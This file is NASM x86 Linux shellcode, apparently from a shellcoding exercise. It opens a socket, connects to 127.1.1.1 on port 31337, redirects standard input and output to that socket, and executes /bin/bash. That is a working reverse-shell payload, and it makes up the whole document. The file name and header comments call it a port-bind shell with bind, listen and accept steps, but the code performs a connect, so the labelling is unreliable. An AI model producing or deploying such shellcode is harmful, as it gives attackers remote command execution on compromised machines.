;port_bind.nasm


;socket
;bind
;listen 
;accept
;dup
;execve



global _start

section .text

_start:

	; int socketcall(int call, unsigned long *args);

	xor eax , eax 
	mov BYTE al, 0x66 ;system call: socketcall

	; sockfd = socket(int socket_family, int socket_type, int protocol);
	; int socket(int domain, int type, int protocol);

	; AF_INET = 2
	; SOCK_STREAM = 1
	; PROTOCOL = 0

	xor ebx, ebx 
	push ebx
	push 1
	push 2
	mov bl , 1
	mov ecx, esp	; mov stack to ECX register
	int 0x80		; initiate interrupt

	mov esi, eax    ; save the returned socket file descriptor

	; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	;           struct sockaddr {
    ;           sa_family_t sa_family;
    ;           char        sa_data[14];
    ;       }

  	;int connect(int sockfd, const struct sockaddr *addr,
    ;socklen_t addrlen);

_connect:

	mov eax, 0x66
	inc ebx
	push 0x0101017f
	push word 0x697a
	push word bx 
	mov ecx, esp
	push byte 16
	push ecx
	push esi
	mov ecx, esp
	inc ebx
	int 0x80

_dup2:

    ; dup2 (63)
    xchg ebx,esi

	xor eax, eax
	mov byte al, 0x3f
	mov ecx, 0x2
    int 0x80

    mov byte al, 0x3f
    dec ecx
    int 0x80

    mov byte al, 0x3f
    dec ecx
    int 0x80

_execve:


	; PUSH the first null dword 
	xor eax, eax
	xor ecx, ecx
	push eax

	; PUSH ////bin/bash (12) 

	push 0x68736162
	push 0x2f6e6962
	push 0x2f2f2f2f


	mov ebx, esp

	push eax
	mov edx, esp

	push ebx
	mov ecx, esp


	mov al, 11
	int 0x80




